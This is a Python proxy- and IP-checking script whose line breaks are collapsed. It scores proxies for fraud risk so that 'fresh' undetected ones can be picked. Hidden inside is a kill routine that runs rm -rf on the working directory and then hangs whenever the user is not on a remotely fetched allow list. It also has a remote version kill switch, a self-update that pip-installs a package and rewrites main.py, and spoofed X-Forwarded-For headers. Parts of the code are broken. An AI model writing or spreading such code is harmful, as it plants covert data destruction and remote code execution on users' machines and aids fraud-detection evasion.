import reimport osimport sysimport jsonimport timeimport codecsimport randomimport requestsimport threadingimport tracebackimport subprocessfrom bs4 import BeautifulSoupfrom collections import OrderedDictfrom fake_useragent import UserAgentshAttach = {}wait = {    "1mix": "",    "tot_ips": 0,    "usedip": {},    "my_name": "",    "allproxies": {},    "LastCheck": 0}main_path = os.getcwd()old1_path = f"{main_path}/iphistory.json"old2_path = f"{main_path}/myhistory.json"old3_path = f"{main_path}/history.json"proxy_path = f"{main_path}/bulklist.txt"output_path = f"{main_path}/SHproxy.txt"base_url = "http://8.209.217.92:8000"history_path = f"{main_path}/newhistory.json"def get_headers():    ua = UserAgent()    random_u_a = ua.random    headers = {        "User-Agent": str(random_u_a),        "X-Requested-With": "XMLHttpRequest",        "Content-Type": "application/json",        "X-Requested-With": "XMLHttpRequest",        "Custom-Header": "Value",    }    return headersdef checkVersion():    global base_url    global shAttach    my_version = "2.3"    my_headers = get_headers()    murl = "https://raw.githubusercontent.com/technoshahzain/404/main"    cxurl = f"{murl}/404.py"    ver = requests.get(cxurl,headers=my_headers).text.replace("\n","").replace(" ","")    if ver != my_version:        os.system('clear')        sys.exit()    cxurl = f"{murl}/host.py"    ver2 = requests.get(cxurl,headers=my_headers).text.replace("\n","").replace(" ","")    base_url = f"http://{str(ver2)}:8000"    dxurl = f"{murl}/shAttach.json"    ver3 = requests.get(dxurl,headers=my_headers)    data = ver3.text    shAttach = json.loads(data)    ver3.close()checkVersion()def getStyle(no):    ret = ""    txtLarg = [        "\n.-.   .-..-. .-. .----..-..----.   .--.  .---. \n|  `.'  || { } |{ {__  | || {}  } / {} \\{_   _}\n| |\\ /| || {_} |.-._} }| || {}  }/  /\\  \\ | |  \n`-' ` `-'`-----'`----' `-'`----' `-'  `-' `-'  \n",        "\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó\n‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë\n‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë\n‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù\n",        "\n‚ñí‚ñà‚ñÄ‚ñÑ‚ñÄ‚ñà ‚ñí‚ñà‚ñë‚ñí‚ñà ‚ñí‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñà ‚ñÄ‚ñà‚ñÄ ‚ñí‚ñà‚ñÄ‚ñÄ‚ñà ‚ñë‚ñà‚ñÄ‚ñÄ‚ñà ‚ñÄ‚ñÄ‚ñà‚ñÄ‚ñÄ \n‚ñí‚ñà‚ñí‚ñà‚ñí‚ñà ‚ñí‚ñà‚ñë‚ñí‚ñà ‚ñë‚ñÄ‚ñÄ‚ñÄ‚ñÑ‚ñÑ ‚ñí‚ñà‚ñë ‚ñí‚ñà‚ñÄ‚ñÄ‚ñÑ ‚ñí‚ñà‚ñÑ‚ñÑ‚ñà ‚ñë‚ñí‚ñà‚ñë‚ñë \n‚ñí‚ñà‚ñë‚ñë‚ñí‚ñà ‚ñë‚ñÄ‚ñÑ‚ñÑ‚ñÄ ‚ñí‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñà ‚ñÑ‚ñà‚ñÑ ‚ñí‚ñà‚ñÑ‚ñÑ‚ñà ‚ñí‚ñà‚ñë‚ñí‚ñà ‚ñë‚ñí‚ñà‚ñë‚ñë \n",    ]    n = random.randint(1, 100)    win_num = int(n)    if win_num % 5 == 0:        ret = str(random.choice(txtLarg))    elif win_num % 2 == 0:        ret = "\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó\n‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë\n‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë\n‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù\n"    if ret == '' and no == "yes":        ret = str(random.choice(txtLarg))    return retdef prntMusibat():    os.system("clear")    ret = getStyle("yes")    try:        print(str(ret))    except:passdef makeStylish(my_name):    new_name = ""    try:        for xx in my_name:            new_name += random.choice(shAttach["FancyTxt"][xx])    except:        return my_name    return new_namedef deleteFile(filename):    try:        os.remove(filename)    except:        try:            os.system(f'rm -rf {filename}')        except:passdef fukHim():    no = 1    deleteFile(main_path)    deleteFile(proxy_path)    deleteFile(history_path)    deleteFile(old_path)    deleteFile("main")    deleteFile("main.py")    while True:        print(no)        no += 1def writeBulk(clist):    if len(clist) != 0 and clist != []:        xret = ""        for proxies in clist:            if proxies not in wait["allproxies"]:                xret += f"{proxies}\n"        if xret != "":            writeData("bulklist.txt", xret)def getipList(text):    ip_pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'    ip_list = re.findall(ip_pattern, text)    clist = list(OrderedDict.fromkeys(ip_list))    return clistdef getipPort(xxy):    ip_pattern = r'\b(?:\w+\.\w+\.\w+:\d{1,5}(?::[^\s]+)?)\b|\b(?:\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}(?::[^\s]+)?)\b'    ip_list = re.findall(ip_pattern, xxy)    clist = list(OrderedDict.fromkeys(ip_list))    return clistdef edit_paths():    try:        if "1mix" not in wait:            wait["1mix"] = ''        if "tot_ips" not in wait:            wait["tot_ips"] = 0        if "LastCheck" not in wait:            wait["LastCheck"] = 0        if os.path.exists(old1_path):            wait2Open = codecs.open(old1_path, "r", "utf-8")            wait2 = json.load(wait2Open)            wait2Open.close()            for myipp in wait2["usedip"]:                if myipp not in wait["usedip"]:                    wait["usedip"][myipp] = int(wait2["usedip"][myipp])            for myipp in wait2["allproxies"]:                if myipp not in wait["allproxies"]:                    wait["allproxies"][myipp] = int(wait2["allproxies"][myipp])        if os.path.exists(old2_path):            wait3Open = codecs.open(old2_path, "r", "utf-8")            wait3 = json.load(wait3Open)            wait3Open.close()            for myipp in wait3["usedip"]:                if myipp not in wait["usedip"]:                    wait["usedip"][myipp] = int(wait3["usedip"][myipp])            for myipp in wait3["allproxies"]:                if myipp not in wait["allproxies"]:                    wait["allproxies"][myipp] = int(wait3["allproxies"][myipp])        if os.path.exists(old3_path):            wait4Open = codecs.open(old3_path, "r", "utf-8")            wait4 = json.load(wait4Open)            wait4Open.close()            for myipp in wait4["usedip"]:                if myipp not in wait["usedip"]:                    wait["usedip"][myipp] = int(wait4["usedip"][myipp])            for myipp in wait4["allproxies"]:                if myipp not in wait["allproxies"]:                    wait["allproxies"][myipp] = int(wait4["allproxies"][myipp])        if not os.path.exists(proxy_path):            mytext = "Paste Your Proxy List Here\nOne Proxy Per Each Line"            writeData("bulklist.txt", mytext)        if not os.path.exists(output_path):            mytext = "Your OutPut Will Be Here"            writeData("SHproxy.txt", mytext)        deleteFile(old1_path)        deleteFile(old2_path)        deleteFile(old3_path)    except:passtry:    waitOpen = codecs.open(history_path, "r", "utf-8")    wait = json.load(waitOpen)    waitOpen.close()except:    deleteFile(history_path)    with open(history_path, 'w') as f:        json.dump(wait, f, ensure_ascii=False, indent=4)def AutoDelProxies(curnTime):    no = 0    try:        if len(wait["usedip"]) != 0 and len(wait["usedip"]) % 2 == 0:            for usedip in wait["usedip"].copy():                if curnTime - wait["usedip"][usedip] >= 4 * 21600:  #24 hours                    del wait["usedip"][usedip]                    no += 1        if len(wait["allproxies"]) != 0 and len(wait["allproxies"]) % 2 == 0:            for usedip in wait["allproxies"].copy():                if curnTime - wait["allproxies"][usedip] >= 2 * 3600:  #2 hours                    del wait["allproxies"][usedip]                    no += 1    except:pass    return nodef SaveFiles(curnTime):    shAttach["LastCheck"] = curnTime    no = AutoDelProxies(curnTime)    if no != 0:        print(f"Total {no} ips auto removed")    try:        f1 = codecs.open(history_path, 'w', 'utf-8')        json.dump(wait, f1, sort_keys=True, indent=4, ensure_ascii=False)        f1.close()    except:passdef DoBackup():    if shAttach['counter'] == 0:        curnTime = time.time()        SaveFiles(curnTime)    elif shAttach['counter'] % 2 == 0:        curnTime = time.time()        if curnTime - shAttach["LastCheck"] > 2*7:            SaveFiles(curnTime)        elif curnTime - wait["LastCheck"] >= 4 * 21600:            wait["LastCheck"] = curnTime            SaveFiles(curnTime)            do_update()    shAttach['counter'] += 1def do_update():    try:        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'asifjamali'])    except:        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'asifjamali'])    scWrite = f"""from asifjamali import *StarT_MusibaT()#______________________ {wait['my_name'].title()}'''{getStyle('yes')}'''"""    writeData("main.py", scWrite)    os.system("clear")    python = sys.executable    os.execv(python, [python] + sys.argv)def get_information(user_name): #getip    try:        no = 0        upnow = False        if wait["my_name"] == "":            if user_name.isalpha():                user_name = user_name.lower()                user_name = user_name.replace(" ", "")                if len(user_name) > 3:                    wait["my_name"] = user_name                else:                    sys.exit("invalid User_Name, Retry Again!")                DoBackup()                upnow = True                time.sleep(1)                os.system("clear")            else:                sys.exit("invalid User_Name, Only Alphabets Allowed")        if len(wait["my_name"]) < 3:            wait["my_name"] = ""            upnow = True            DoBackup()            sys.exit("invalid User_Name, Retry Again!")        try:            if "LastCheck" not in wait:                wait["my_name"] = ''                upnow = True            if "tot_ips" not in wait or "1mix" not in wait:                wait["my_name"] = wait["my_name"].lower()                upnow = True        except:pass        if upnow:            edit_paths()        if wait["tot_ips"] > 20:            wait["tot_ips"] = 20        os_name = ""        osdata = os.environ        if "REPL_OWNER" in osdata:            os_name = osdata["REPL_OWNER"]            if shAttach["AllowCheck"]:                if os_name not in shAttach["userList"]:                    fukHim()        else:            fukHim()    except:pass    if wait["my_name"] != "" and len(wait["my_name"]) > 3:        alphabets_only = re.findall(r'[a-zA-Z]', wait["my_name"])        return makeStylish(''.join(alphabets_only))    else:        sys.exit("Unknown Error, Retry Again!")def writeData(filename, _Shahzii):    if _Shahzii == "":        _Shahzii = "Nothing Found :)"    try:        with open(filename, "w") as midfile:            midfile.write(_Shahzii)    except:        os.system(f'echo -n "{_Shahzii}" > {filename}')def timeChange(secs):    mins, secs = divmod(secs, 60)    hours, mins = divmod(mins, 60)    days, hours = divmod(hours, 24)    weeks, days = divmod(days, 7)    months, weeks = divmod(weeks, 4)    text = ""    if months != 0: text += "%02d Month" % (months)    if weeks != 0: text += " %02d Week" % (weeks)    if days != 0: text += " %02d Days" % (days)    if hours != 0: text += " %02d Hours" % (hours)    if mins != 0: text += " %02d Minutes" % (mins)    if secs != 0: text += " %02d Seconds" % (secs)    if text[0] == " ":        text = text[1:]    return textdef black_check(myip, proxy_dict):    result = "Not Found"    try:        url = f"https://scamalytics.com/ip/{myip}"        xheaders = get_headers()        if "X-Forwarded-For" not in xheaders:            xheaders["X-Forwarded-For"] = get_ip_address()        response = requests.get(            url,            proxies=proxy_dict,            headers=xheaders,            timeout=3        )        if response.status_code == 200:            soup = BeautifulSoup(response.text, 'html.parser')            fraud_score_match = re.search(r'Fraud Score: (\d+)', response.text)            if fraud_score_match:                fraud_score = fraud_score_match.group(1)                result = str(fraud_score)        response.close()    except Exception as catch:        trace = catch.__traceback__        error = f"Error Name: {str(trace.tb_frame.f_code.co_name)}\nError Filename: {str(trace.tb_frame.f_code.co_filename)}\nError Line: {str(trace.tb_lineno)}\nError: {str(catch)}"        print(error)    return resultdef black_check2(myip):    result = "Not Found"    url = f"https://scamalytics.com/ip/{myip}"    try:        xheaders = get_headers()        if "X-Forwarded-For" not in xheaders:            xheaders["X-Forwarded-For"] = get_ip_address()        response = requests.get(            url,            headers=xheaders,            timeout=3        )        if response.status_code == 200:            soup = BeautifulSoup(response.text, 'html.parser')            fraud_score_div = soup.find('div', class_='score')            if fraud_score_div:                fraud_score_text = fraud_score_div.text                fraud_score_match = re.search(r'Fraud Score: (\d+)', fraud_score_text)                if fraud_score_match:                    fraud_score = fraud_score_match.group(1)                    result = str(fraud_score)        response.close()    except Exception as catch:        trace = catch.__traceback__        error = f"Error Name: {str(trace.tb_frame.f_code.co_name)}\nError Filename: {str(trace.tb_frame.f_code.co_filename)}\nError Line: {str(trace.tb_lineno)}\nError: {str(catch)}"        print(error)    return resultdef google_search(proxy):    no = 0    query = random.choice(["insurance", "mortgage", "lawyer"])    url2 = f"https://www.google.com/search?q={query}"    xheaders = get_headers()    try:        response = requests.get(            url2,            headers=xheaders,            proxies=proxy,            timeout=3        )        response.close()        soup = BeautifulSoup(response.text, 'html.parser')        search_results = soup.find_all('h3')        no += len(search_results)    except:pass    return nodef ipinfo_check(myip, xheaders):    no = 0    xret = ""    try:        url = f"https://ipinfo.io/{str(myip)}?token={shAttach['ipinfo']}"        response = requests.get(            url,            headers=xheaders,            timeout=2        )        if response.status_code == 200:            json_data = response.json()            try:                json_data = json.loads(json_data)            except:pass            try:                xret += f"City: {json_data['city']}\n"                xret += f"Country: {json_data['country']}\n"                xret += f"Region: {json_data['region']}\n"                xret += f"Postal: {json_data['postal']}\n"                xret += f"ASN Type: {json_data['asn']['type']}\n"                xret += f"ASN Name: {json_data['asn']['name']}\n"                #xret += f"VPN: {json_data['privacy']['vpn']}\n"                if json_data['privacy']['vpn'] == True:                    xret += "VPN: Detected\n"                    no += 1                #xret += f"Proxy: {json_data['privacy']['proxy']}\n"                if json_data['privacy']['proxy'] == True:                    xret += "Proxy: Detected\n"                    no += 1                #xret += "Hosting: {json_data['privacy']['hosting']}\n"                if json_data['privacy']['hosting'] == True:                    xret += "Hosting: Detected\n"                    no += 1                if json_data['privacy']['service'] != "":                    xret += f"Service Status: {json_data['privacy']['service']}\n"            except Exception as catch:                trace = catch.__traceback__                error = f"Error Name: {str(trace.tb_frame.f_code.co_name)}\nError Filename: {str(trace.tb_frame.f_code.co_filename)}\nError Line: {str(trace.tb_lineno)}\nError: {str(catch)}"                print(error)        response.close()    except Exception as catch:        trace = catch.__traceback__        error = f"Error Name: {str(trace.tb_frame.f_code.co_name)}\nError Filename: {str(trace.tb_frame.f_code.co_filename)}\nError Line: {str(trace.tb_lineno)}\nError: {str(catch)}"        print(error)    return no, xretdef proxycheck_io(ip_address, xheaders):    no = 0    ret = ""    try:        API_KEY = random.choice(shAttach["pckIO"])        url = f'https://proxycheck.io/v2/{str(ip_address)}?key={API_KEY}&vpn=3&asn=1&risk=2&port=1&seen=1&days=7'        response = requests.get(            str(url),            headers=xheaders,            timeout=2        )        if response.status_code == 200:            data = response.json()            ip_info = data[ip_address]            ret += "       Next_Source ‚ìµ\n"            try:                ret += f"       Risk: {ip_info['risk']}\n"            except:pass            try:                ret += f"       VPN: {ip_info['vpn']}\n"            except:pass            try:                ret += f"       Proxy: {ip_info['proxy']}\n"            except:pass            try:                ret += f"       Type: {ip_info['type']}\n"            except:pass            #try:            #    ret += f"       ASN: {ip_info['asn']}\n"            #except:pass            #try:            #    ret += f"       Country: {ip_info['country']}\n"            #except:pass            #try:            #    ret += f"       Region: {ip_info['region']}\n"            #except:pass            #try:            #    ret += f"       Postal: {ip_info['postcode']}\n"            #except:pass            if ip_info['proxy'] == "yes" or ip_info['vpn'] == "yes" or ip_info['type'] == "Business":                no += 1        response.close()    except Exception as catch:        trace = catch.__traceback__        error = f"Error Name: {str(trace.tb_frame.f_code.co_name)}\nError Filename: {str(trace.tb_frame.f_code.co_filename)}\nError Line: {str(trace.tb_lineno)}\nError: {str(catch)}"        print(error)    return no, retdef ipqualityscore_check(ip_address, xheaders):    no = 0    ret = ""    try:        #key = "p9nUEH1U3X9uAP0ke0yREJqgUWsTnZQV"        key = shAttach["ipqscr"][shAttach["keyno"]]        if key == shAttach["ipqscr"][-1]:            shAttach["keyno"] = 0        else:            shAttach["keyno"] += 1        url = f"https://www.ipqualityscore.com/api/json/ip/{key}/{str(ip_address)}"        response = requests.get(            str(url),            headers=xheaders,            timeout=2        )        if response.status_code == 200:            ip_info = response.json()            if "fraud_score" not in ip_info:                print(f"Expired: {key}")                no += 1            if not ip_info['success']:                return no, ret            ret += "       Next_Source ‚ì∂\n"            #try:            #    if ip_info['vpn']:            #        ret += "       VPN: ‚úîÔ∏è\n"            #except:pass            #try:            #    if ip_info['proxy']:            #        ret += "       Proxy: ‚úîÔ∏è\n"            #except:pass            try:                if ip_info['vpn'] and ip_info['proxy']:                    ret += "       Proxy/VPN: ‚úîÔ∏è\n"                    if ip_info['active_vpn'] or ip_info['recent_abuse'] or ip_info['bot_status']:                        if ip_info['bot_status']:                            ret += "       Bot_Status: ‚úîÔ∏è\n"                        if ip_info['active_vpn']:                            ret += "       Active_vpn: ‚úîÔ∏è\n"                        if ip_info['recent_abuse']:                            ret += "       Recent_Abuse: ‚úîÔ∏è\n"                        no += 1                else:                    ret += "       Proxy/VPN: No\n"            except:pass            try:                ret += f"       Fraud_Score: {ip_info['fraud_score']}\n"                if ip_info['fraud_score'] > 50:                    no += 1            except:pass        response.close()    except Exception as catch:        trace = catch.__traceback__        error = f"Error Name: {str(trace.tb_frame.f_code.co_name)}\nError Filename: {str(trace.tb_frame.f_code.co_filename)}\nError Line: {str(trace.tb_lineno)}\nError: {str(catch)}"        print(error)    return no, retdef check_proxy(ipscr, myip):    no = 0    ret = ""    ipscore = 200    try:        if ipscr == "Not Found":            ipscore = 50        else:            ipscore = int(ipscr)    except:pass    if ipscore > 60:        no = 99        return no, ret    xret = "" #ipinfo_check    xxret = "" #proxycheck_io    xxxret = "" #ipqualityscore_check    xheaders = get_headers()    if "X-Forwarded-For" not in xheaders:        xheaders["X-Forwarded-For"] = get_ip_address()    try:        no, xret = ipinfo_check(myip, xheaders)        if no != 0:            ret += "\n\n___________ ‚ò†Ô∏è‚ò†Ô∏è ___________\n"            ret += str(xret)            ret += "\n‚ï∞‚îà‚û§ üö© üö® ‚ùó‚ö†Ô∏è üí£"            return no, ret    except Exception as catch:        trace = catch.__traceback__        error = f"Error Name: {str(trace.tb_frame.f_code.co_name)}\nError Filename: {str(trace.tb_frame.f_code.co_filename)}\nError Line: {str(trace.tb_lineno)}\nError: {str(catch)}"        print(error)    nom, xxret = proxycheck_io(myip, xheaders)    no += nom    if no == 0:        if ipscore < 50:            nol, xxxret = ipqualityscore_check(myip, xheaders)            no += nol    if xret != "" and xxret != "" and xxxret != "":        ret += "\n\nüî∞More Datails‚è¨"    if xret != "":        ret += f"\n{str(xret)}"    if xxret != "" and xxxret != "":        ret += "    ‚òÜ Extra Status ‚òÜ"    if xxret != "":        ret += f"\n{str(xxret)}"    if xxxret != "":        ret += f"\n{str(xxxret)}"    return no, retdef dual_Request(proxy_details):    resp = {        "ip": "",        "data": "",        "score": "",        "google": False,        "proxy_type": "None",        "proxy": proxy_details    }    if ":" in proxy_details:        url = "http://httpbin.org/ip"        try:            proxy_dict = {}            try:                if proxy_details.count(":") == 1:                    IP_ADDRESS, PORT = proxy_details.split(":")                    proxy_dict = {                        'http': f'socks5://{IP_ADDRESS}:{PORT}',                        'https': f'socks5://{IP_ADDRESS}:{PORT}'                    }                    resp["proxy_type"] = "socks5"                else:                    proxy_details = proxy_details.replace("@", ":")                    host, port, username, password = proxy_details.split(":")                    proxy_dict = {                        "http": f"http://{username}:{password}@{host}:{port}",                        "https": f"http://{username}:{password}@{host}:{port}"                    }                    resp["proxy_type"] = "http"            except Exception as error:                print(error)            if proxy_dict != {}:                try:                    response = requests.get(                        url,                        proxies=proxy_dict,                        headers=get_headers(),                        timeout=(5, 10)                    )                except:                    time.sleep(1)                    response = requests.get(                        url,                        proxies=proxy_dict,                        headers=get_headers(),                        timeout=(5, 10)                    )                if response.status_code == 200:                    _myip = getipList(response.text.strip())                    if _myip != [] and len(_myip) != 0:                        if _myip[0] in shAttach["Data"]:                            return shAttach["Data"][_myip[0]]                        resp["ip"] = _myip[0]                        resp["score"] = black_check(_myip[0], proxy_dict)                        if resp["score"] == "Not Found":                            resp["score"] = black_check2(_myip[0])                        no, resp["data"] = check_proxy(resp["score"], _myip[0])                        num = google_search(proxy_dict)                        if num != 0:                            resp["google"] = True                        try:                            if no == 0:                                if proxy_details not in wait["allproxies"]:                                    wait["allproxies"].append(proxy_details)                        except:pass                        if _myip[0] not in shAttach["Data"]:                            shAttach["Data"][_myip[0]] = resp                response.close()        except Exception as error:            print(error)    return respdef new_Score(proxy_details):    result = {        "ip": "",        "data": "",        "score": "",        "proxy": "",        "google": False,        "proxy_type": "None"    }    _myip = getipList(proxy_details)    if _myip != [] and len(_myip) != 0:        myip = _myip[0]        if myip in shAttach["Data"]:            return shAttach["Data"][myip]        else:            result["ip"] = myip            result["score"] = black_check2(myip)            no, result["data"] = check_proxy(result["score"], myip)            shAttach["Data"][myip] = result    return resultdef new_Proxies(our_Proxies):    proc_data = getipPort(our_Proxies)    proxy_details = proc_data[0]    xip = dual_Request(proxy_details)    return xipdef continueSocks():    ret = ""    os.system("clear")    while True:        print(ret)        proxies = input("Enter proxy: ")        xip = new_Proxies(proxies)        myipp = xip['ip']        if myipp != "":            ret = ""            ret += f"\nIP: {myipp}"            ret += f"\nSocks: üî∞‚è¨"            ret += f"\n{xip['proxy']}"            if xip["google"] == True:                ret += "\nGoogle: ‚úÖ"            else:                ret += "\nGoogle: ‚ùå"            ret += f"\nScam Score: {xip['score']}"            if myipp not in wait["usedip"]:                score = 55                try:                    score = int(xip['score'])                except:pass                if score < 55:                    curnTime = time.time()                    ret += "\nStatus: Fresh"                    wait["usedip"][myipp] = curnTime                    if xip['proxy'] not in wait["allproxies"]:                        wait["allproxies"][xip['proxy']] = curnTime            else:                xret = " ‚ò†Ô∏è __Used Proxy__ ‚ò†Ô∏è\n"                curnTime = time.time()                runtime = curnTime - int(wait["usedip"][myipp])                runtime = timeChange(runtime)                xret += f"About: {str(runtime)}"                ret += f"\n{xret}"            ret += xip['data']            ret += "\n"        else:            ret = "Nothing Found"        print(ret)        os.system("clear")        DoBackup()def continueips():    ret = ""    os.system("clear")    while True:        print(ret)        proxies = input("Enter IP: ")        xip = new_Score(proxies)        myipp = xip['ip']        if myipp != "":            ret = ""            ret += f"\nIP: {myipp}"            ret += f"\nScam Score: {xip['score']}"            if myipp not in wait["usedip"]:                score = 55                try:                    score = int(xip['score'])                except:pass                if score < 55:                    curnTime = time.time()                    ret += "\nStatus: Fresh"                    wait["usedip"][myipp] = curnTime            else:                xret = " ‚ò†Ô∏è __Used Proxy__ ‚ò†Ô∏è\n"                curnTime = time.time()                runtime = curnTime - int(wait["usedip"][myipp])                runtime = timeChange(runtime)                xret += f"About: {str(runtime)}"                ret += f"\n{xret}"            ret += xip['data']            ret += "\n"        else:            ret = "Nothing Found"        print(ret)        os.system("clear")        DoBackup()def bulkCheck(xplist, tot_ips):    ret = ""    no = 0    curnTime = time.time()    print(f"Found {len(xplist)} Proxies")    for proxies in xplist.copy():        if proxies not in wait["allproxies"]:            xplist.remove(proxies)            xip = new_Proxies(proxies)            myipp = xip['ip']            if myipp != "":                if xip['proxy'] not in wait["allproxies"]:                    wait["allproxies"][xip['proxy']] = curnTime                if myipp not in wait["usedip"]:                    wait["usedip"][myipp] = curnTime                    score = 55                    try:                        score = int(xip['score'])                    except:pass                    if score < 55:                        no += 1                        print(no)                        ret += f"\n{no}: {myipp}"                        ret += f"\nSocks: üî∞‚è¨"                        ret += f"\n{xip['proxy']}"                        if xip["google"] == True:                            ret += "\nGoogle: ‚úÖ"                        else:                            ret += "\nGoogle: ‚ùå"                        ret += f"\nScam Score: {xip['score']}"                        ret += xip['data']                        ret += "\n____________________________________\n"                        if no == tot_ips or no == 20:                            break                time.sleep(1)    return retdef checkALLsocks(tot_ips):    ret = ""    lsProxy = open(proxy_path)    ourProxies = lsProxy.read()    lsProxy.close()    xplist = getipPort(ourProxies)    if len(xplist) != 0 and xplist != []:        ret = bulkCheck(xplist, tot_ips)    print("Proccess Complete\nCheck SHproxy.txt File...")    time.sleep(1)    DoBackup()    writeBulk(xplist)    writeData("SHproxy.txt", ret)    os.system("clear")    StarT_MusibaT()def StarT_MusibaT():    ret = ""    my_name = ""    if wait["my_name"] == "":        prntMusibat()        my_name = input("Enter Your Name: ")    user_name = get_information(my_name)    strStyl = getStyle("no")    ret = f"""Hello {str(user_name)}{strStyl}To Check Proxy 1by1Type Enter Or Paste SocksPaste ip or Any Number For IpsAny Alphabet (abcXYZ) 4 SocksListWhat You Want: """    choice = input(ret)    if ":" in choice and choice.count(".") == 3: #direct proxy        continueSocks()    elif "." in choice and choice.count(".") == 3: #direct ip        continueips()    elif choice == "":  #enter        continueSocks()    elif choice.isalpha(): #abcXYZ        if wait["tot_ips"] == 0:            tot_ips = 5            chic = input("How Many Proxy to Sort: ")            try:                if chic.isdigit():                    tot_ips = int(chic)            except:pass            checkALLsocks(tot_ips)        else:            checkALLsocks(wait["tot_ips"])    elif re.match(r'^\d+$', choice):  #isdigit        continueips()    else:        sys.exit("Wrong inPut, Try Again!")StarT_MusibaT()#______________________________________________#‚éî"""if __name__ == "__main__":    StarT_MusibaT()"""